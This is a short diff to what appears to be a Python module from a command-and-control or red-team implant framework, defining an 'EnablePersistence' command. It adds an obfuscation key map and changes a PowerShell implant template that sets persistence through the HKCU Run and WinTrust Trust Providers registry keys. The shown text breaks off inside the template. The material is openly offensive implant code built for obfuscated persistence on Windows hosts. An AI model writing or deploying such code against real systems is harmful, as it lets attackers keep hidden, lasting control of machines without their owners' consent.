@@ -2,6 +2,10 @@ class EnablePersistence:
     type = "EP"
     args = None
     input = "enable_persistence"
+    # this must be unique across ALL implants, any matching keys will be merged causing errors.
+    # To safely format this use the following format "<type>_variablename":"value" i.e.
+    #   fd_base64_var: base64filecontents
+    obfuscation_keypairs = {}
 
     def process_implant_response(self, data, args):
         if data.decode() == "0":
@@ -11,7 +15,7 @@ class EnablePersistence:
 
     def implant_text(self):
         var = '''
-$global:gr = $MyInvocation.MyCommand.ScriptBlock 
+if ($global:gr -eq $null -or $global:gr -eq ""){$global:gr = $MyInvocation.MyCommand.ScriptBlock} 
 function {{ ron.obf_create_persistence }}(){
     $abc = "HKCU:/Software/Microsoft/Windows/CurrentVersion/Run/"
     $def = "HKCU:/Software/Microsoft/Windows/CurrentVersion/WinTrust/Trust Providers/"
